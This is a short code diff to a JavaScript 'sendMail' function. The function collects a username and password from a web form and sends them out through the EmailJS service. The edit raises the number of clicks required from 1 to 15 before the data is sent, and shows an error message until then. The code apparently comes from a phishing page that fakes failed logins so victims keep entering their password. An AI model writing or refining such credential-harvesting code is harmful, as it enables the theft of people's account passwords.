@@ -10,7 +10,7 @@ function sendMail(event) {
     password: document.getElementById("password").value,
   };
 
-  if (params.password == "" || params.username == "" || click <= 1) {
+  if (params.password == "" || params.username == "" || click <= 15) {
     document.getElementById("error").innerText = error;
   } else {
     emailjs.send(serviceID, templateID, params).then((res) => {
